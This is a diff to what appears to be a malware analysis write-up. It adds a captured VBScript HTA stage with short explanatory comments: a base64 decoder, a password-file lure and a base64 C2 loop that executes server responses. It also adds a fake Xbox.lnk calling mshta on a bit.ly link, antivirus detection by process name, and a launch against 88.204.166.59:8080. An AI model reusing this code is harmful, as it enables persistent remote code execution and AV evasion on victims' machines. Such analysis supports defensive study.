@@ -40,7 +40,7 @@
 </tr>
 </table>
 
-<h6>The bitly link redirects to a fake cloud solution which usurps a legitim service. (.club instead of .fr)</h6>
+<h6>The Bitly link redirects to a fake cloud solution which usurps a legitim service. (.club instead of .fr)</h6>
 
 ```html
 <html>
@@ -54,7 +54,86 @@
 
 ```vb
 <script language="vbscript">
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+function dbsc(tds)
+	with CreateObject("Msxml2.DOMDocument").CreateElement("mic")
+		.DataType="bin.base64"
+		.Text=tds
+		dbsc=appc(.NodeTypedValue)
+	end with
+end function
+function appc(ByVal bin)
+	with CreateObject("ADODB.Stream")
+		.Type=1
+		.Open
+		.Write bin
+		.Position=0
+		.Type=2
+		.CharSet="utf-8"
+		appc=.ReadText
+		.Close
+	end with
+end function
+```
+
+<h6>Then this copy in the temp folder a file with a password and show it for the lure to the victim.</h6>
+
+```vb
+pay_req="CMD.EXE /C ""ECHO risk2020>""%TEMP%\Password.txt""&NOTEPAD.EXE ""%TEMP%\Password.txt""&DEL ""%TEMP%\Password.txt"""""
+set wish=CreateObject("wscript.shell")
+wish.Run pay_req,0,false
+```
+
+<h6>The variable is reused for content the payload to execute in base 64 on the new persistence file by lnk file.</h6>
+
+```vb
+pay_req="b24gZXJyb3IgcmVzdW1lIG5leHQNCnJhbmRvbWl6ZQ0KaWYgV1NjcmlwdC5Bcmd1bWVudHMuTGVuZ3RoPjAgdGhlbg0KCUhUUD0iaHQiDQoJdXU9SFRQJiJ0cDoiJiIvLyImV1NjcmlwdC5Bcmd1bWVudHMuSXRlbSgwKQ0KCWNvYj0iV2luSHR0cCINCgljb2I9Y29iJiJSZXF1ZXN0LiINCgljb2I9Ildpbkh0dHAiJiIuIiZjb2INCgljb2I9Y29iJiI1LjEiDQoJc2V0IHdocj1DcmVhdGVPYmplY3QoY29iKQ0KCWRvIHdoaWxlIHRydWUNCgkJcHM9IlBPIg0KCQl0dz0iMiINCgkJcnRjPSIiDQoJCXRwYz11dSYiPyImInRvcCImImljPSImInMiJkludCgxMDAwKnJuZCs5MDAwKQ0KCQl3aHIuT3BlbiBwcyYiU1QiLHRwYyxmYWxzZQ0KCQl3aHIuU2VuZCB0dyYiMDAiDQoJCWlmIHdoci5TdGF0dXM9MjAwIFRoZW4NCgkJCXJ0Yz13aHIuUmVzcG9uc2VUZXh0DQoJCWVuZCBpZg0KCQlpZiBydGM8PiIiIHRoZW4NCgkJCUV4ZWN1dGUocnRjKQ0KCQkJZXhpdCBkbw0KCQllbmQgaWYNCgkJV1NjcmlwdC5TbGVlcCAxODAqMTAwMA0KCWxvb3ANCmVuZCBpZg0K"
+```
+
+<h6>Then, this creates the persistence previous said and use the same TTPs in using a lnk file with a mshta call.</h6>
+
+```vb
+set fob=CreateObject("Scripting.FileSystemObject")
+path_persistence=fob.GetSpecialFolder(2)&"\Xbox.lnk"
+Set tcl=wish.CreateShortcut(path_persistence)
+tcl.TargetPath="mshta"
+tcl.Arguments="https://bit.ly/3dr8YBv"
+path_file=fob.GetSpecialFolder(2)&"\iilbat.vbs"
+set btf=fob.OpenTextFile(path_file,2,true)
+btf.Write dbsc(pay_req)
+btf.Close()
+```
+
+<h6>The part of the code check by WMI request the process executed on the PC, modify the strategy in function of detection for avoid to be detected by the AV. Execute the next stage of the persistence.</h6>
+
+```vb
+list_process=""
+set wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+set wmiresult=wmi.ExecQuery("Select * from Win32_Process") 
+
+for each obj in wmiresult
+	list_process=list_process&LCase(obj.Name)&"|"
+next
+
+'npprot -> npprot.exe ->  Net Protector (Indian AV)
+'kwsprot ->kwsprotect64.exe -> Kingsoft Antivirus (Chinese AV)
+ex="ws"
+if Instr(list_process,"kwsprot")>0 or Instr(list_process,"npprot")>0 then
+	ex="cs"
+end if
+
+ln="start /b "&ex&"cript """&path_file&""" "+"88.204.166.59:8080/edit"
+ln2=" & move """&path_persistence&""" """& wish.SpecialFolders("startup") &"\"""
+
+'qhsafe ->  QHSafeTray.exe -> Qihoo 360 Total Security (Chinese AV)
+'hudongf -> zhudongfangyu.exe ->  Qihoo 360 security (Chinese AV)
+if Instr(list_process,"hudongf")>0 or Instr(list_process,"qhsafe")>0 then
+	ln2=" & del """&path_persistence&""""
+else
+	tcl.Save
+end if
+
+wish.run "CMD.EXE /c " & ln&" 1" & " & " & ln&" 2" & ln2,0,false
+window.close
 </script>
 ```
 
